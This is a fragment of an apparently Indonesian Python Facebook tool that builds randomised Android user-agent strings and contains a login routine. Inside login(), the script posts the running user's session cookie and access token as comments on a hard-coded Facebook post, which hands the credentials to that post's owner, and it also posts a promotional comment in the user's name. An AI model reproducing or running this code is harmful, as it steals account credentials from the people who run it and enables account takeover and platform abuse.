...
except:ugen2=['Mozilla/5.0 (Linux; Android 9; Gravity_6P Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/326.0.0.13.97;]']
...
for x in range(999):
	...
	TEMAN = f'Mozilla/5.0 (Linux; Android {str(rr(4,12))}; V{str(rr(1111,3000))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(4,10))}.0 Chrome/{str(rr(10,100))}.0.{str(rr(111,9999))}.{str(rr(100,300))} Mobile Safari/537.36 VivoBrowser/{str(rr(1,12))}{str(rr(1,12))}.0.0'
	F = f"{TEMAN}"
	if F in redmi:pass
	else:redmi.append(F)
...
def TERSERAH():
	...
	return str(rc([f"Mozilla/5.0 (Linux; Android {str(rr(1,10))}.{str(rr(0,10))}; Samsung Galaxy Note 9 Build/SM-N960N) AppleWebKit/{str(rr(100,600))}.{str(rr(10,99))} (KHTML, like Gecko) Version/5.2 Chrome/{str(rr(10,100))}.0.{str(rr(111,9999))}.{str(rr(100,300))} Mobile Safari/{str(rr(100,600))}.{str(rr(10,99))}"]))
...
def login():
	...
	try:
		...
		tem      = ('\nMantap Bang @[100033480633498:0]\n\nNikmatilah Masa Mudamu, Tapi Jangan Lupa Dengan Masa Depanmu\n')
		slebew = ('\nKomentar Ditulis Oleh Temen\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
		link = ('https://www.facebook.com/100033480633498/posts/840643623728318/?app=fbl')
		...
		ses.post(f"https://graph.facebook.com/840643623728318/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/840643623728318/comments/?message={token}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/840643623728318/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
